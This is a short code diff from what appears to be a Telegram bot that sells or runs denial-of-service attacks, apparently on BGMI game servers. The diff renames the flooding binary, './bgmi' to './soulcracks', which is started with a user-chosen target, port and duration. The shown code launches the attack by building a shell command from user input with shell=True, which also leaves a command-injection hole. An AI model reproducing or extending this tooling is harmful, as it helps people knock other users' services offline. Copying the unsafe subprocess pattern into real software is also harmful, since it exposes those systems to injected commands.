@@ -407,7 +407,7 @@ def handle_duration_choice(call):
                 log_command(user_id, state['target'], state['port'], state['time'])
                 ongoing_attacks[user_id] = True
                 start_attack_reply(call.message, state['target'], state['port'], state['time'])
-                full_command = f"./bgmi {state['target']} {state['port']} {state['time']} 100"
+                full_command = f"./soulcracks {state['target']} {state['port']} {state['time']} 100"
                 subprocess.run(full_command, shell=True)
                 bot.reply_to(call.message, f"𝐁𝐠𝐦𝐢 𝐀𝐭𝐭𝐚𝐜𝐤 𝐅𝐢𝐧𝐢𝐬𝐡𝐞𝐝.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {state['target']} \n𝐏𝐨𝐫𝐭: {state['port']} \n𝐓𝐢𝐦𝐞: {state['time']} seconds")
                 del ongoing_attacks[user_id]
